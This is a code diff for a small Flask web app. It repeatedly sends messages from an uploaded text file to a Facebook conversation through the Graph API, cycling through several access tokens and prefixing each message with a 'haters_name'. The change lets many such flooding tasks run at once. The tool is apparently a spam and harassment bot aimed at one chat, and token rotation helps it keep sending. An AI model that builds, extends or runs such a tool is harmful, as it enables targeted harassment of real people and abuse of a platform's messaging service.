@@ -1,15 +1,11 @@
 from flask import Flask, render_template, request, jsonify
-import threading, time, requests, os
+import threading, time, requests, os, uuid
 
 app = Flask(__name__)
 
-running = False
-task_thread = None
+tasks = {}  # {task_id: {"thread": thread, "running": True/False}}
 
-def send_messages(config):
-    global running
-    running = True
-
+def send_messages(task_id, config):
     tokens = config["tokens"]
     convo_id = config["convo_id"]
     haters_name = config["haters_name"]
@@ -24,16 +20,16 @@ def send_messages(config):
         messages = [m.strip() for m in f.readlines() if m.strip()]
 
     count = 0
-    while running:
+    while tasks[task_id]["running"]:
         for i, msg in enumerate(messages):
-            if not running:
+            if not tasks[task_id]["running"]:
                 break
             token = tokens[i % len(tokens)]
             url = f"https://graph.facebook.com/v15.0/t_{convo_id}"
             payload = {"access_token": token, "message": f"{haters_name} {msg}"}
             r = requests.post(url, data=payload)
             count += 1
-            print(f"[+] Sent {count}: {haters_name} {msg} | Status: {r.status_code}")
+            print(f"[Task {task_id}] Sent {count}: {haters_name} {msg} | Status: {r.status_code}")
             time.sleep(delay)
 
 @app.route("/")
@@ -42,10 +38,6 @@ def index():
 
 @app.route("/start", methods=["POST"])
 def start_task():
-    global task_thread, running
-    if running:
-        return jsonify({"status": "Already running!"})
-
     # Token select
     token_option = request.form.get("tokenOption")
     tokens = []
@@ -65,7 +57,7 @@ def start_task():
 
     # Save NP file
     txt_file = request.files.get("txtFile")
-    np_path = "np_file.txt"
+    np_path = f"np_{uuid.uuid4().hex}.txt"
     if txt_file:
         txt_file.save(np_path)
 
@@ -77,16 +69,23 @@ def start_task():
         "np_file": np_path
     }
 
-    task_thread = threading.Thread(target=send_messages, args=(config,))
-    task_thread.start()
+    task_id = str(uuid.uuid4())[:8]  # short ID
+    tasks[task_id] = {"running": True, "thread": None}
 
-    return jsonify({"status": "Task started successfully"})
+    t = threading.Thread(target=send_messages, args=(task_id, config))
+    tasks[task_id]["thread"] = t
+    t.start()
+
+    return jsonify({"status": f"Task started successfully", "task_id": task_id})
 
 @app.route("/stop", methods=["POST"])
 def stop_task():
-    global running
-    running = False
-    return jsonify({"status": "Task stopped"})
+    task_id = request.form.get("taskId")
+    if task_id in tasks and tasks[task_id]["running"]:
+        tasks[task_id]["running"] = False
+        return jsonify({"status": f"Task {task_id} stopped"})
+    return jsonify({"status": f"No active task with ID {task_id}"})
+
 
 if __name__ == "__main__":
     app.run(debug=True, port=5000)
